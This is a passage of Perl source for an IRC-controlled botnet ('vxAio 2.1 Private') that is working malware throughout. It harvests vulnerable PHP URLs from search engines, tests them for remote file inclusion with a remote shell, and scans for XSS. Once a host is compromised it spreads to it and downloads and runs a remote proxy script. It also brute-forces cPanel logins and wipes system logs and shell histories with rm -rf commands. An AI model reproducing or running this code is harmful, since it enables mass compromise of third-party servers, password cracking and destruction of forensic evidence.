                        sendraw( $IRC_cur_socket,
                            "PRIVMSG $msg :12(7SafeMode12) " . $shows . "" )
                          if ($safe_print);
                    }
                }
                $last = $phpsite;
                undef($phpsite);                            # Faster Bot?
                $co2++;
            }
            undef(@phpgo);
            if ( $co2 < 300 ) { exit(); }
            sendraw( $IRC_cur_socket,
                "PRIVMSG $msg :Done With (" . $co2 . ")!" );
        }
        exit;
    }
}

sub googler() {
    my $msg = $_[0];
    my $str;
    my @lst;
    my $last = "";
    my $pg   = 0;
    my $cn   = 0;
    my $i    = 0;
    my @tmrx = (
        "nl",  "se", "de",   "fi", "pl", "dk",  "com", "net",
        "org", "ca", "info", "gr", "br", "pe",  "ir",  "cc",
        "ro",  "ru", "hu",   "ve", "ar", "at",  "fr",  "it",
        "do",  "ms", "cl",   "js", "hk", "tw",  "kr",  "tv",
        "ch",  "mg", "no",   "st", "lv", "ph",  "cz",  "au",
        "nz",  "uk", "us",   "id", "tk", "biz", "edu", "mx",
        "ag",  "py", "gt"
    );

    if ( !$ascmethod ) {
        for ( my $i = 0 ; $i < $pages ; $i++ ) {
            if ( $msg =~ m/site:/i || $msg =~ m/site%3A/i ) {
                $str = "" . $msg . "";
            }
            else {
                $str =
                  "site%3A" . $domene[ rand scalar @domene ] . "\+" . $msg . "";
            }
            if ( $pg > 900 ) { $pg = int( rand(200) ); }
            my $gquer = $GoogleDomene[ rand scalar @GoogleDomene ]
              . "/search?q=$str&hl=en&start=$i&sa=N&num=100";
            my $side = spisern($gquer);
            while ( $side =~ m/<a href="http:\/\/([^>\"]+)\"\s+class=l>/g ) {
                next if ( $last eq $1 );
                push( @lst, $1 );
                $last = $1;
            }
            $pg += 100;
        }
    }
    elsif ( $ascmethod eq 1 ) {
        my $lrnd = $domene[ rand scalar @domene ];
        while ( $cn < 900 ) {
            if ( $msg =~ m/site:/i || $msg =~ m/site%3A/i ) {
                $str = "" . $msg . "";
            }
            else { $str = "site%3A" . $lrnd . "\+" . $msg . ""; }
            my $que = $GoogleDomene[ rand scalar @GoogleDomene ]
              . "/search?q=$str&hl=en&start=$cn&sa=N&num=100";
            my $site = spisern($que);
            while ( $site =~ m/<a href="http:\/\/([^>\"]+)\"\s+class=l>/g ) {
                next if ( $last eq $1 );
                push( @lst, $1 );
                $last = $1;
            }
            $cn += 100;
        }
    }
    elsif ( $ascmethod eq 2 ) {
        while ( $cn < 900 ) {
            $str = "" . $domene[ rand scalar @domene ] . "/ " . $msg . "";
            my $que = $GoogleDomene[ rand scalar @GoogleDomene ]
              . "/search?q=$str&hl=ru&lr=&newwindow=1&start=$cn&num=99&sa=N";
            my $site = spisern($que);
            while ( $site =~ m/<a href="http:\/\/([^>\"]+)\"\s+class=l>/g ) {
                next if ( $last eq $1 );
                push( @lst, $1 );
                $last = $1;
            }
            $cn += 99;
        }
    }
    elsif ( $ascmethod eq 3 ) {
        while ( $cn < $pag ) {
            foreach $langs (@tmrx) {
                $str = "" . $msg . "\+site%3A" . $langs . "";
                my $side = $GoogleDomene[ rand scalar @GoogleDomene ]
                  . "/search?q=$str&hl=en&start=$cn&sa=N&num=100";
                my $site = spisern($side);
                while ( $site =~ m/<a href="http:\/\/([^>\"]+)\"\s+class=l>/g )
                {
                    next if ( $last eq $1 );
                    push( @lst, $1 );
                    $last = $1;
                }
            }
            $cn += 100;
        }
    }
    elsif ( $ascmethod eq 4 ) {
        while ( $ct < 600 ) {
            for ( my $e = 0 ; $e < 6 ; $e++ ) {
                $str =
                  "" . $NickName[ rand scalar @NickName ] . "\+" . $msg . "";
                my $sider = $GoogleDomene[ rand scalar @GoogleDomene ]
                  . "/search?q=$str&hl=en&start=$ct&sa=N&num=100";
                my $sitens = spisern($sider);
                while (
                    $sitens =~ m/<a href="http:\/\/([^>\"]+)\"\s+class=l>/g )
                {
                    next if ( $last eq $1 );
                    push( @lst, $1 );
                    $last = $1;
                }
            }
            $ct += 100;
        }
    }
    return @lst;
}

sub workout {
    my @pushed  = ();
    my %visiter = ();
    foreach my $phpchk (@_) {
        next
          if ( ( $phpchk !~ m/\?(.*)\=/i )
            || ( $phpchk !~ m/\/?(.*)\=/i )
            || ( $phpchk =~ m/\/viewtopic.php\?(.*)/i )
            || ( $phpchk =~ m/\/showthread.php\?(.*)/i ) );
        next
          if ( ( $phpchk =~ m/.jsp(.*)\=/i )
            || ( $phpchk =~ m/.asp(.*)\=/i )
            || ( $phpchk =~ m/.aspx(.*)\=/i ) );
        ($slitted) = split( /=/, $phpchk );
        $side = "" . $slitted . "=";
        next if $visiter{$side}++;
        push( @pushed, $side );
    }
    return @pushed;
}

sub spisern($) {
    my $url = $_[0];
    $url =~ s/http:\/\///;
    my $host  = $url;
    my $query = $url;
    my $page  = "";
    $host =~ s/href=\"?http:\/\///;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $query =~ s/$host//;

    if ( $query eq "" ) {
        $query = "/";
    }
    eval {
        my $sock = IO::Socket::INET->new(
            PeerAddr => "$host",
            PeerPort => "80",
            Proto    => "tcp"
        ) or return;
        print $sock
"GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
        my @r = <$sock>;
        $page = "@r";
        close($sock);
    };
    return $page;
}

sub vulntester() {
    my $msg  = $_[0];
    my $strs = $_[1];
    if ( my $pid = fork ) { waitpid( $pid, 0 ); }
    else {
        if (fork) { exit; }
        else {
            &modcheck($msg);    # Mod Check!
            my $set     = fix_url($strs);
            my $execute = "" . $set . $cmdsh . "";
            my $show    = "" . $set . $showshell . "";
            my $sprder  = "" . $set . $bcurl . "";
            my $xsstest = "" . $set . "";
            my $req     = HTTP::Request->new( GET => $execute );
            my $ua      = LWP::UserAgent->new();
            $ua->timeout(7);
            my $response = $ua->request($req);
            my $mrx      = $response->content;

            if ( $response->is_success ) {
                if (
                    (
                           $mrx =~ /f7f32504cabcb48c21030c024c6e5c1a/
                        && $mrx =~ /uid=/
                        && $mrx =~ m/Uname:(.*?)<br>/
                        && $mrx !~ m/SySOs:WINNT/
                    )
                  )
                {
                    ( my $die ) = split( /<br>/, $1 );
                    sendraw( $IRC_cur_socket, "PRIVMSG $msg :7" . $1 . "" );
                    sendraw( $IRC_cur_socket, "PRIVMSG $msg :" . $show . "" );
                    if ( $bcurl ne 0 ) {
                        &xeqt_back( $msg, $sprder );    # xeQted!
                    }
                }
                elsif ($mrx =~ /f7f32504cabcb48c21030c024c6e5c1a/
                    && $mrx =~ /DNS-/
                    && $mrx =~ /[Adapter]/ )
                {
                    sendraw( $IRC_cur_socket,
                        "PRIVMSG $msg :14(7Windows14) " . $show . "" );
                    if ( $bcurl ne 0 ) {
                        &xeqt_back( $msg, $sprder );    # xeQted!
                    }
                }
                elsif ( $mrx =~ /f7f32504cabcb48c21030c024c6e5c1a/ ) {
                    &xsScan( $msg, $xsstest ) if ($xsson);
                    sendraw( $IRC_cur_socket,
                        "PRIVMSG $msg :12(7SafeMode12) " . $show . "" );
                }
                else {
                    if ( !$xsson ) {
                        sendraw( $IRC_cur_socket,
                            "PRIVMSG $msg :Nothing on " . $xsstest . "" );
                    }
                    else {
                        my $x = &xsScan( $msg, $xsstest );
                        if ( ($xsson) && ( $x ne "xeQt" ) ) {
                            sendraw( $IRC_cur_socket,
                                "PRIVMSG $msg :Nothing on " . $xsstest . "" );
                        }
                    }
                }
            }
        }
        undef $execute;
        exit;
    }
}

sub urlvisiter() {
    my $msg  = $_[0];
    my $side = $_[1];
    my $set  = fix_url($side);
    if ( my $pid = fork ) { waitpid( $pid, 0 ); }
    else {
        if (fork) { exit; }
        else {
            &modcheck($msg);    # Mod Check!
            my $siden = fix_url($side);
            my $req   = HTTP::Request->new( GET => $siden );
            my $ua    = LWP::UserAgent->new();
            $ua->timeout(10);
            my $response = $ua->request($req);
            my $mrx      = $response->content;
            if ( $response->is_success ) {
                sendraw( $IRC_cur_socket,
                    "PRIVMSG $msg :" . $siden . " Visited." );
            }
            else {
                sendraw( $IRC_cur_socket,
                    "PRIVMSG $msg :Error: " . $siden . "" );
            }
        }
        exit;
    }
}

sub xsScan() {
    my $msg    = $_[0];
    my $xsside = $_[1];
    my $x;
    my $xssuri =
      "" . $xsside . "%3Ch5%3E%3Cscript%20src%3D" . $xsimg . "%3E%3C/h5%3E";
    my $mrx = spisern($xssuri);
    if ( $mrx =~ m/<h5><script src=(.*)><\/h5>/g ) {
        $x = "xeQt";
        sendraw( $IRC_cur_socket, "PRIVMSG $msg :14(9XSS14) " . $xssuri . "" );
    }
    return $x;
}

sub fix_url($) {
    my $str = $_[0];
    if ( $str =~ m/^http:\/\/(.*)/i || $str =~ m/^https:\/\/(.*)/i ) {
        $set = "" . $str . "";
    }
    else {
        $set = "http://" . $str . "";
    }
    return $set;
}

sub gdataonl() {
    my $msg  = $_[0];
    my $hash = $_[1];
    if ( length($hash) != 32 ) {
        sendraw( $IRC_cur_socket,
            "PRIVMSG $msg :(Error) " . $hash . " Is NOT a Vailed md5hash!" );
        return;
    }
    my $md5query =
      "http://gdataonline.com/qkhash.php?mode=xml&hash=" . $hash . "";
    my $hasjchk = spisern($md5query);
    if (   $hasjchk =~ m/<status>Success<\/status>/g
        && $hasjchk =~ m/<result>(.*)<\/result>/g )
    {
        my $hfind = $1;
        sendraw( $IRC_cur_socket,
            "PRIVMSG $msg :14(12md5hash14) " . $hash . " is " . $hfind . "" );
    }
    else {
        sendraw( $IRC_cur_socket, "PRIVMSG $msg :Nothing found in database." );
    }
}

sub xsh() {
    my $msg = $_[0];
    my $toorsh;
    my $spread;
    my $md5hash = spisern($cmdsh);
    if ( $md5hash =~ m/f7f32504cabcb48c21030c024c6e5c1a/ ) {
        $toorsh = "ready142Go.";
    }
    else { $toorsh = "4Deleted"; }
    if ( !$bcurl ) {
        sendraw( $IRC_cur_socket, "PRIVMSG $msg :12Shell: $toorsh" );
    }
    else {
        my $que = spisern($bcurl);
        if (   $que =~ /shell_exec/
            || $que =~ /exec/
            || $que =~ /system/
            || $que =~ /passthru/
            || $que =~ /popen/
            || $que =~ /proc_open/ )
        {
            $spread = "ready142Go.";
        }
        else {
            $spread = "4Deleted";
        }
        sendraw( $IRC_cur_socket,
            "PRIVMSG $msg :12Shell: $toorsh - 12Spread: $spread" );
    }
}

sub modcheck() {
    my $msg = $_[0];
    eval "use HTTP::Request;";
    if ($@) {
        sendraw( $IRC_cur_socket, "PRIVMSG $msg :12HTTP::12Request Not Found." )
          if ($warned);
        exit;
    }
    eval "use LWP::UserAgent;";
    if ($@) {
        sendraw( $IRC_cur_socket,
            "PRIVMSG $msg :12LWP::12UserAgent Not Found." )
          if ($warned);
        exit;
    }
}

sub getnsave() {
    my $msg  = $_[0];
    my $url  = $_[1];
    my $file = $_[2];
    eval "use LWP::Simple;";
    if ($@) {
        sendraw( $IRC_cur_socket, "PRIVMSG $msg :12LWP::12Simple Not Found." );
        return;
    }
    my $dir = `pwd`;
    getstore( $url, $file );
    if ( -f $file && -x $file ) {
        sendraw( $IRC_cur_socket,
            "PRIVMSG $msg :" . $file . " saved in " . $dir . "" );
    }
    else {
        sendraw( $IRC_cur_socket, "PRIVMSG $msg :(4Error) Download Failed" );
    }
}

sub uridecoder() {
    my $msg = $_[0];
    my $str = $_[1];
    eval "use URI::Escape;";
    if ($@) {
        sendraw( $IRC_cur_socket, "PRIVMSG $msg :12URI::12Escape Not Found." );
        return;
    }
    my $strcode = uri_escape($str);
    sendraw( $IRC_cur_socket,
        "PRIVMSG $msg :15(12URL.Decoder15) " . $strcode . "" );
}

# Kvasir, Uol, AllTheWeb
sub kvasir() {
    my $str = $_[0];
    my $i   = 0;
    my @lst;
    my $strg;
    my $mix = $pages * 3;
    while ( $i < $mix ) {
        if ( $str =~ m/site:/i || $msg =~ m/site%3A/i ) {
            $strg = "" . $str . "";
        }
        else {
            $strg =
              "" . $str . "\+site%3A" . $domene[ rand scalar @domene ] . "";
        }
        my $kquery =
"http://www.kvasir.no/nettsok/searchResult.html?offset=$i&searchRegion=world&searchExpr=$strg";
        my $page = spisern($kquery);
        while ( $page =~ m/<span class="url">http:\/\/(.+)<\/span\>/g ) {
            next if ( $last eq $1 );
            push( @lst, $1 );
            $last = $1;
        }
        $i += 10;
    }
    return @lst;
}

sub uolscan() {
    my $str = $_[0];
    my $i   = 0;
    my @lst;
    my $last = "";
    while ( $i <= $pag ) {
        my $uquery =
            "http://busca.uol.com.br/www/index.html?q="
          . $str
          . "&start="
          . $i . "";
        my $req      = HTTP::Request->new( GET => $uquery );
        my $ua       = LWP::UserAgent->new();
        my $response = $ua->request($req);
        my $page     = $response->content;
        while ( $page =~ m/<a href=\"http:\/\/([^>\"]+)/g ) {
            next if ( $1 eq $last );
            push( @lst, $1 );
            $last = $1;
        }
        $i += 10;
    }
    return @lst;
}

sub alltheweb() {
    my $str = $_[0];
    my $i   = 0;
    my @list;
    my $last = "";
    while ( $i < 500 ) {
        my $query =
          "http://www.alltheweb.com/search?cat=web&cs=iso88591&q=$str&o=$i";
        my $req      = HTTP::Request->new( GET => $query );
        my $ua       = LWP::UserAgent->new();
        my $response = $ua->request($req);
        my $page     = $response->content;
        while ( $page =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g )
        {
            next if ( $1 eq $last );
            push( @list, $1 );
            $last = $1;
        }
        $i += 10;
    }
    return @list;
}

# Spreader..
sub xeqt_back() {
    my $msg   = $_[0];
    my $bcxqt = $_[1];
    my $req   = HTTP::Request->new( GET => $bcxqt );
    my $ua    = LWP::UserAgent->new();
    $ua->timeout(10);
    my $response = $ua->request($req);
    if ( $response->is_success ) {
        sendraw( $IRC_cur_socket, "PRIVMSG $msg :(4Spreader) xeQted.." )
          if ($spmsgs);
    }
    else {
        ( my $print ) = split( /=/, $bcxqt );
        sendraw( $IRC_cur_socket, "PRIVMSG $msg :(4ERROR) " . $print . "=" )
          if ($spmsgs);
    }
}

sub proxysrv() {
    my $msg    = $_[0];
    my $purl   = "http://members.lycos.co.uk/charlott1974/pr.txt";    # Proxy!
    my $pfile  = ".ICE.unix";
    my $stprx  = "perl $pfile $0";                                    # xeQt!
    my $prxsrv = `uname -n`;
    eval "use LWP::UserAgent;";
    if ($@) {
        sendraw( $IRC_cur_socket,
            "PRIVMSG $msg :12LWP::12UserAgent Not Found." );
        return;
    }
    $ua = LWP::UserAgent->new;
    my $req = HTTP::Request->new( GET => $purl );
    my $res = $ua->request( $req, $pfile );
    if ( $res->is_success ) {
        sendraw( $IRC_cur_socket,
            "PRIVMSG $msg :(12OK!) Proxy xeQted on: 14" . $prxsrv . "" );
        system($stprx);
        unlink($pfile);
    }
    else {
        sendraw( $IRC_cur_socket, "PRIVMSG $msg :Cannot xeQt proxy server!" );
    }
}

sub cPanelBruter() {
    my $msg     = $_[0];
    my $haddr   = $_[1];
    my $cuser   = $_[2];
    my $cport   = $_[3];
    my $countcp = 0;
    eval "use IO::Socket;";
    if ($@) {
        sendraw( $IRC_cur_socket, "PRIVMSG $msg :12IO::12Socket WTF?" );
        return;
    }
    eval "use LWP::Simple;";
    if ($@) {
        sendraw( $IRC_cur_socket, "PRIVMSG $msg :12LWP::12Simple Missing!" );
        return;
    }
    eval "use MIME::Base64;";
    if ($@) {
        sendraw( $IRC_cur_socket, "PRIVMSG $msg :12MIME::12Base64 Missing!" );
        return;
    }
    sendraw( $IRC_cur_socket, "PRIVMSG $msg :(12cPanel.Bruter) Starting..." );
    foreach my $P (@cpanelpasswds) {
        $countcp++;
        chomp $P;
        $passwd = $P;
        $authx  = encode_base64( $cuser . ":" . $passwd );
        my $sock = IO::Socket::INET->new(
            Proto    => "tcp",
            PeerAddr => "$haddr",
            PeerPort => "$cport"
        ) || die "Error connect ro host\n";
        print $sock "GET / HTTP/1.1\n";
        print $sock "Authorization: Basic $authx\n";
        print $sock "Connection: Close\n\n";
        read $sock, $answer, 128;
        close($sock);

        if ( $answer =~ /Moved/ ) {
            sendraw( $IRC_cur_socket,
                    "PRIVMSG $msg :(10Cracked!) "
                  . $haddr . ":"
                  . $cport
                  . " - l/p:"
                  . $cuser . ":"
                  . $passwd
                  . " - Done." );
            return;
        }
    }
    sendraw( $IRC_cur_socket,
            "PRIVMSG $msg :(12cPanel.Bruter) Tested "
          . $countcp
          . " password(s) without luck!" );
}

sub vxclean() {
    my $msg = $_[0];
    sendraw( $IRC_cur_socket, "PRIVMSG $msg :(12vxClean) Cleaning Logfiles!" );
    unlink($0);
    system 'rm -rf /tmp/>>/dev/null';
    system 'rm -rf /var/tmp/>>/dev/null';
    system 'rm -rf /var/log/lastlog';
    system 'rm -rf /var/log/wtmp';
    system 'rm -rf /etc/wtmp';
    system 'rm -rf /var/run/utmp';
    system 'rm -rf /etc/utmp';
    system 'rm -rf /var/log';
    system 'rm -rf /var/logs';
    system 'rm -rf /var/adm';
    system 'rm -rf /var/apache/log';
    system 'rm -rf /var/apache/logs';
    system 'rm -rf /usr/local/apache/log';
    system 'rm -rf /usr/local/apache/logs';
    system 'rm -rf /root/.bash_history';
    system 'rm -rf /root/.ksh_history';
    sleep 3;
    system 'find / -name *.bash_history -exec rm -rf {} \;';
    system 'find / -name *.bash_logout -exec rm -rf {} \;';
    system 'find / -name "log*" -exec rm -rf {} \;';
    system 'find / -name *.log -exec rm -rf {} \;';
    sleep 1;
    sendraw( $IRC_cur_socket, "PRIVMSG $msg :Wiped all logs out of our way!!" );
}

# vxAio 2.1 Private - xeQt!
